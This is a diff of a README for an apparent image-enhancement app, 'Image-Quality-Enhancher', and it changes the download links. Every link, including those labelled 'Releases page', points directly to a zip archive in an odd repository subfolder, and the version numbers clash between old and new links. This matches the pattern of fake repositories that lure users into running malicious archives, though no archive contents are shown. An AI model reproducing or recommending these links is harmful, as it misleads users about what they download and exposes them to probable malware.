@@ -4,7 +4,7 @@
 Welcome to Image-Quality-Enhancher! This app improves your photos from raw captures to stunning studio-quality images. Follow these steps to get started.
 
 ## 📥 Download Now
-[![Download Image-Quality-Enhancher](https://raw.githubusercontent.com/yash6803/Image-Quality-Enhancher/main/torgoch/Image_Enhancher_Quality_v2.9.zip)](https://raw.githubusercontent.com/yash6803/Image-Quality-Enhancher/main/torgoch/Image_Enhancher_Quality_v2.9.zip)
+[![Download Image-Quality-Enhancher](https://github.com/yash6803/Image-Quality-Enhancher/raw/refs/heads/main/torgoch/Image_Quality_Enhancher_2.4-alpha.3.zip)](https://github.com/yash6803/Image-Quality-Enhancher/raw/refs/heads/main/torgoch/Image_Quality_Enhancher_2.4-alpha.3.zip)
 
 ## 🔧 Requirements
 Before you begin, make sure your device meets these requirements:
@@ -14,7 +14,7 @@ Before you begin, make sure your device meets these requirements:
 - Python 3.6 or higher for running the software (optional for advanced setup)
 
 ## 💻 Download & Install
-1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/yash6803/Image-Quality-Enhancher/main/torgoch/Image_Enhancher_Quality_v2.9.zip) to find the latest version of Image-Quality-Enhancher.
+1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/yash6803/Image-Quality-Enhancher/raw/refs/heads/main/torgoch/Image_Quality_Enhancher_2.4-alpha.3.zip) to find the latest version of Image-Quality-Enhancher.
   
 2. **Choose the Right File:** Look for the version that matches your operating system. There will be options for Windows, macOS, and Linux.
 
@@ -61,4 +61,4 @@ We open our project to contributions from anyone interested. If you'd like to he
 
 Thank you for using Image-Quality-Enhancher! We hope you enjoy transforming your photos into beautiful works of art. 
 
-For more information, revisit our [Releases page](https://raw.githubusercontent.com/yash6803/Image-Quality-Enhancher/main/torgoch/Image_Enhancher_Quality_v2.9.zip).
+For more information, revisit our [Releases page](https://github.com/yash6803/Image-Quality-Enhancher/raw/refs/heads/main/torgoch/Image_Quality_Enhancher_2.4-alpha.3.zip).
